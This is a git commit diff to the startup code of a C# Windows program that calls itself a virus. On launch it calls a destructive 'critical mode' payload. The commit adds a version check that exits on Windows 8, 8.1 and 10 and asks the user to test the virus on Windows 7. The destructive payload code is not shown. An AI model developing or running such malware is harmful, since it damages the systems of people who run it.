400e79ae79fafbe23057c0189a2f72a230750d60
Chris Martin <chrixsmar@gmail.com>
2018-06-11 17:37:27 +0100

    fix

--- Agenois/MainThread.cs
+++ Agenois/MainThread.cs
@@ -21,6 +21,42 @@ namespace Agenois
         {
             //Everything on startup.
             Payloads.Destructive.EnableCriticalMode();
+
+            OperatingSystem os = Environment.OSVersion;
+            Version vs = os.Version;
+            string operatingSystem = "";
+            if (os.Platform == PlatformID.Win32NT)
+            {
+                switch (vs.Major)
+                {
+                    case 6:
+                        if (vs.Minor == 2)
+                            operatingSystem = "8";
+                        else if (vs.Minor == 3)
+                            operatingSystem = "8.1";
+                        break;
+                    case 10:
+                        operatingSystem = "10";
+                        break;
+                    default:
+                        break;
+                }
+            }
+            if (operatingSystem == "10")
+            {
+                MessageBox.Show("This virus doesn't work on Windows 10" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+            else if (operatingSystem == "8")
+            {
+                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
+            else if (operatingSystem == "8.1")
+            {
+                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
+                Environment.Exit(0);
+            }
         }
     }
 }
